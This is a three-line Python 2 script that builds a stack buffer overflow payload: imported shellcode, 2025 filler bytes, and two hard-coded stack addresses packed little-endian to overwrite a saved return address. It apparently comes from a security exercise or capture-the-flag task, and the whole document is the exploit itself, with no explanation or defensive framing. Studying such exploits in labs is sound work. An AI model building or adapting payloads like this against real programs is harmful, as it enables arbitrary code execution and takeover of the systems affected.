from shellcode import shellcode
from struct import pack
print shellcode+'\x11'*2025+pack('<I',0xbffe9fd8)+pack('<I',0xbffea7ec)
